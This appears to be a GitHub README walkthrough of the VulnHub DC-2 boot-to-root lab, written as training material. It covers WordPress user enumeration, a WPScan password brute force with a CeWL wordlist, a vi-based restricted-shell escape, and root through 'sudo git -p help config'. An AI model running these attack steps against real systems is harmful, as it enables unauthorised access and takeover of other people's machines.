# 🔐 DC-02 CTF Machine Walkthrough

> A complete walkthrough of the DC-02 Boot-to-Root CTF machine, demonstrating the methodology used to move from initial reconnaissance to full system compromise.

---

## 📖 Overview

The **DC-02** machine is a beginner-friendly Boot-to-Root challenge that focuses on web application enumeration, credential discovery, restricted shell escape, and Linux privilege escalation.

Rather than relying on a single vulnerability, this machine emphasizes the importance of **methodical enumeration**. Every piece of information collected during reconnaissance contributes to the next stage of the attack.

> **Difficulty:** Beginner  
> **Platform:** VulnHub  
> **Operating System:** Linux

---

# 🎯 Objectives

The goal of this machine was to:

- Discover exposed services
- Enumerate the web application
- Identify valid credentials
- Gain SSH access
- Escape the restricted shell
- Escalate privileges
- Capture the final root flag

---

# 🛠️ Tools Used

| Tool | Purpose |
|-------|---------|
| Nmap | Network & Service Enumeration |
| CeWL | Custom Password List Generation |
| WPScan | WordPress Enumeration |
| SSH | Remote Access |
| Git | Privilege Escalation |
| GTFOBins | Linux Privilege Escalation Reference |

---

# 🗺️ Attack Workflow

```
Reconnaissance
      │
      ▼
Virtual Host Discovery
      │
      ▼
WordPress Enumeration
      │
      ▼
Credential Discovery
      │
      ▼
SSH Access
      │
      ▼
Restricted Shell Escape
      │
      ▼
Privilege Escalation
      │
      ▼
Root Access
```

---

# 🔍 Step 1 – Reconnaissance

The first step was identifying open ports and services running on the target.

```bash
nmap -sC -sV -p- 192.168.1.9
```

### Results

| Port | Service |
|------|---------|
|22|SSH|
|80|HTTP|

The scan revealed a web server and an SSH service, indicating that the web application would likely be the initial attack surface.

---

# 🌐 Step 2 – Virtual Host Discovery

While browsing the target, the application redirected to a hostname instead of the IP address.

To resolve this, the local hosts file was updated.

```bash
sudo nano /etc/hosts
```

Add:

```text
192.168.1.9    dc-2
```

Now browse:

```
http://dc-2
```

After updating the hosts file, the website loaded correctly.

---

# 🔎 Step 3 – WordPress Enumeration

The website was identified as a WordPress application.

A custom password list was generated using words found on the website.

```bash
cewl http://dc-2 -w pass.txt
```

Next, WPScan was used to enumerate users.

```bash
wpscan --url http://dc-2 --enumerate u
```

### Information Collected

- WordPress detected
- Valid usernames identified
- Custom password list created

These findings would later be used for credential discovery.

---

# 🔑 Step 4 – Credential Discovery

The discovered usernames were tested using the custom password list.

```bash
wpscan --url http://dc-2 \
--usernames users.txt \
--passwords pass.txt
```

### Result

A valid username and password combination was successfully identified.

These credentials also worked for SSH authentication.

---

# 💻 Step 5 – Initial Access

Using the discovered credentials, SSH access was obtained.

```bash
ssh tom@192.168.1.9
```

After logging in, it became clear that the user was restricted to a limited shell.

Only a few commands such as **vi**, **less**, and **echo** were available.

---

# 🚀 Step 6 – Escaping the Restricted Shell

The restricted shell was bypassed using the **vi** editor.

```vim
:set shell=/bin/bash
:shell
```

After obtaining a Bash shell, the environment variables were restored.

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash
```

The system now provided a fully interactive shell for further enumeration.

---

# 👑 Step 7 – Privilege Escalation

The next step was checking the user's sudo permissions.

```bash
sudo -l
```

The output revealed that **Git** could be executed with elevated privileges.

Using a known GTFOBins technique:

```bash
sudo git -p help config
```

Escape to a shell:

```bash
!/bin/bash
```

Verify privileges:

```bash
whoami
id
```

Retrieve the final flag:

```bash
cat /root/final-flag.txt
```

🎉 Root access was successfully achieved.

---

# 📚 Key Takeaways

✅ Enumeration is the foundation of every penetration test.

✅ Virtual hosts should always be checked during web enumeration.

✅ Custom wordlists often outperform generic password lists.

✅ Restricted shells are not necessarily secure.

✅ Always inspect `sudo -l` for privilege escalation opportunities.

✅ GTFOBins is an essential resource for Linux privilege escalation.

---

# 🎓 Skills Practiced

- Network Enumeration
- Service Enumeration
- WordPress Enumeration
- Password Attacks
- SSH Authentication
- Linux Enumeration
- Shell Escaping
- Linux Privilege Escalation
- GTFOBins
- Documentation

---

# 🏁 Conclusion

DC-02 demonstrates that successful penetration testing is not about finding a single exploit—it is about following a structured methodology.

By carefully enumerating services, identifying hidden information, reusing credentials, escaping restricted environments, and analyzing privilege escalation paths, it was possible to progress from an external attacker to the root user.

This machine reinforced one important lesson:

> **"Good enumeration makes exploitation possible."**

---

## 👨‍💻 Author

**Avinash Patil**

🔗 LinkedIn: **https://www.linkedin.com/in/avinash-patil**

If you found this walkthrough useful, ⭐ star the repository and feel free to share your feedback.
